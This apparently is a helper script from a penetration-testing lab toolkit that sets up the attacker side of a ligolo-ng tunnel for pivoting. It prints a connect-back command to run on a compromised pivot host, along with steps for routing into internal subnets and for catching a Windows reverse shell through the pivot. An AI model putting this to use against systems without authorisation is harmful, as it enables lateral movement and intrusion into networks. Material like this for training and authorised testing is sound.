#!/usr/bin/env bash
# ligolo-setup.sh -- attacker-side ligolo-ng setup, matching notes/pivoting-tunneling.md exactly.
# Only the attacker side is executable here -- the agent binary runs on the pivot host, which this
# script has no access to, so it prints the exact copy-paste command for that side instead.
#
# Usage:
#   ligolo-setup.sh              start the TUN interface + proxy listener
#   ligolo-setup.sh --teardown   remove the TUN interface and stop a proxy this script started
set -uo pipefail

TUN_NAME="ligolo"
PID_FILE="${XDG_RUNTIME_DIR:-/tmp}/.ligolo-setup-proxy.pid"

if [[ "${1:-}" == "--teardown" ]]; then
    echo "[*] Tearing down ligolo-ng TUN interface and proxy."
    if [[ -f "$PID_FILE" ]]; then
        PID="$(cat "$PID_FILE")"
        # The proxy was started via `exec sudo ...`, so it runs as root and this PID is root-owned.
        # An unprivileged kill/kill -0 against it returns EPERM, so go through sudo unless we are
        # already root -- otherwise teardown silently reports success without stopping anything.
        KILL_PREFIX=""
        [[ $EUID -ne 0 ]] && command -v sudo >/dev/null 2>&1 && KILL_PREFIX="sudo"
        if [[ -n "$PID" ]] && $KILL_PREFIX kill -0 "$PID" 2>/dev/null; then
            echo "[*] Killing proxy process (pid $PID)"
            $KILL_PREFIX kill "$PID"
        else
            echo "[*] No running proxy found for recorded pid ${PID:-<none>} -- it was probably already stopped."
        fi
        rm -f "$PID_FILE"
    fi
    if ip link show "$TUN_NAME" >/dev/null 2>&1; then
        sudo ip link delete "$TUN_NAME"
        echo "[*] Deleted TUN interface '$TUN_NAME'."
    else
        echo "[*] No '$TUN_NAME' interface present -- nothing to delete."
    fi
    echo "[!] Reminder: this can't reach the pivot host -- Ctrl+C the 'agent' process there manually."
    exit 0
fi

PROXY_BIN="./proxy"
AGENT_HINT="agent"
if ! command -v "$PROXY_BIN" >/dev/null 2>&1 && [[ ! -x "$PROXY_BIN" ]]; then
    if command -v proxy >/dev/null 2>&1; then
        PROXY_BIN="proxy"
    else
        echo "[!] ligolo-ng 'proxy' binary not found in cwd or PATH." >&2
        echo "    Download: https://github.com/nicocha30/ligolo-ng/releases" >&2
        exit 1
    fi
fi

if ip link show "$TUN_NAME" >/dev/null 2>&1; then
    echo "[*] TUN interface '$TUN_NAME' already exists -- skipping creation."
else
    echo "[*] Creating TUN device '$TUN_NAME'"
    sudo ip tuntap add dev "$TUN_NAME" mode tun user "$(whoami)" && sudo ip link set "$TUN_NAME" up
fi

# Resolved before the banner below -- the banner prints the agent-side connect-back command, so it
# has to reflect the port the proxy actually binds, not a default.
LISTEN_PORT="${LIGOLO_PORT:-11601}"

# The agent has to reach us over the engagement VPN, so prefer the VPN interface address. A plain
# `ip route get <internet host>` returns the *default route* source IP, which on a Kali box is
# normally the LAN address -- unreachable from an OSCP/HTB target, and a confusing failure to debug.
ATTACKER_IP=""
for vpn_if in tun0 tun1 tap0 ligolo-vpn; do
    [[ "$vpn_if" == "$TUN_NAME" ]] && continue   # our own pivot TUN is not the VPN
    if ip link show "$vpn_if" >/dev/null 2>&1; then
        ATTACKER_IP="$(ip -4 -o addr show dev "$vpn_if" 2>/dev/null | grep -oP '(?<=inet )[0-9.]+' | head -n1)"
        [[ -n "$ATTACKER_IP" ]] && { echo "[*] Using VPN interface '$vpn_if' address: $ATTACKER_IP"; break; }
    fi
done
if [[ -z "$ATTACKER_IP" ]]; then
    ATTACKER_IP="$(ip route get 1.1.1.1 2>/dev/null | grep -oP '(?<=src )\S+')"
    [[ -n "$ATTACKER_IP" ]] && \
        echo "[!] No VPN interface (tun0/tun1/tap0) found -- falling back to the default-route address $ATTACKER_IP." >&2 && \
        echo "    If the target reaches you over a VPN, this is probably the WRONG address; override it by hand." >&2
fi
if [[ -z "$ATTACKER_IP" ]]; then
    ATTACKER_IP="<YOUR_ATTACKER_IP>"
    echo "[!] Could not auto-detect attacker IP -- fill it in manually below." >&2
fi

echo
echo "=================================================================="
echo "Once the proxy below is listening, paste this on the PIVOT HOST:"
echo
echo "  ./$AGENT_HINT -connect ${ATTACKER_IP}:${LISTEN_PORT} -ignore-cert -retry"
echo
echo "Then, in the proxy console that starts below:"
echo "  session                 # list/select the connected agent"
echo "  ifconfig                # view the target's interfaces/subnets"
echo "  start                   # bring the tunnel interface up, begin routing"
echo
echo "In a separate terminal, once 'start' is running, add a route to the discovered subnet:"
echo "  sudo ip route add <discovered_subnet>/24 dev $TUN_NAME"
echo
echo "For a reverse listener through the pivot (e.g. catching a Windows reverse shell):"
echo "  listener_add --addr 0.0.0.0:<port> --to 127.0.0.1:<local_catch_port> --tcp"
echo
echo "For a second hop (double pivot): repeat this whole process with a distinctly-named"
echo "second TUN interface (edit TUN_NAME at the top of this script) for the second agent."
echo "=================================================================="
echo
echo "[*] Starting proxy on 0.0.0.0:${LISTEN_PORT} in the foreground -- Ctrl+C to stop (run '$0 --teardown' after)."
# `exec` below preserves this PID, so recording $$ here records the proxy's own PID.
echo "$$" > "$PID_FILE"
echo "  ./$AGENT_HINT -connect ${ATTACKER_IP}:${LISTEN_PORT} -ignore-cert -retry" >&2
exec sudo "$PROXY_BIN" -selfcert -laddr "0.0.0.0:${LISTEN_PORT}"
